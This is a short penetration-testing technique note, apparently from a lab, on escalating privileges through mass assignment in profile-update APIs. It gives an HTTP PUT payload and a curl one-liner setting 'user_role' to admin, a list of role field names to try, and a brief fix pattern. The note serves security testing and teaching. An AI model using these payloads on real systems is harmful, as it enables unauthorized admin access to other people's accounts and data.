# Profile update mass assignment — `user_role` escalation

**Bug class:** Mass assignment (API6)  
**When to use:** JSON `PUT`/`PATCH` profile or account update after normal registration  
**Confirmed on:** Herra (Voorivex lab)

## Requirements

- Valid JWT/session from normal registration + login
- Update endpoint that binds full JSON body (often undocumented fields work)
- Read endpoint that echoes role (`GET /api/user/me`)
- Protected admin route (`GET /api/admin/flag` or `/admin`)

## Payload

```http
PUT /api/user/edit HTTP/1.1
Host: target.example
Authorization: Bearer <token>
Content-Type: application/json

{"user_role":"admin"}
```

## curl one-liner

```bash
curl -s -X PUT "$BASE/api/user/edit" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"user_role":"admin"}'
```

## Why it worked

- Swagger/docs listed only `firstname`/`lastname`; server had no write allowlist.
- `user_role` is the exact model property name (not `role`, `isAdmin`, etc.).
- Escalation verified via read + admin route, not only the PUT response.

## Why signup injection may fail

Some labs harden registration but leave update endpoints open. Always test both create and update lifecycles.

## Field names to try (one at a time)

`user_role`, `role`, `is_admin`, `isAdmin`, `admin`, `type`, `permissions`

## Fix pattern

DTO allowlist per endpoint; server-side defaults for role; deny unknown fields.
